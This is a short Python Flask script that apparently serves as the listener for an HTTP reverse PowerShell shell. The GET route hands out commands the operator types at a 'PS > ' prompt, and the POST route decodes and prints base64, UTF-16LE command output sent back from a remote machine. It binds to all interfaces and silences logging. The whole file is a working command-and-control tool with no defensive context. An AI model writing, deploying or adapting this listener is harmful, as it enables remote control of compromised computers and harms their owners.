#!/usr/bin/env python3

from base64 import b64decode
from urllib.parse import unquote
from flask import Flask, request

app = Flask(__name__)

import logging

log = logging.getLogger(__name__)
log.setLevel(logging.ERROR)


@app.route("/", methods=["GET"])
def stdin():

    if request.method != "GET":
        return None

    return input("PS > ")


@app.route("/output", methods=["POST"])
def stdout():
    print(
        b64decode(unquote(request.get_data(), encoding="utf-8")[5:]).decode("utf-16-le")
    )

    return ""


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
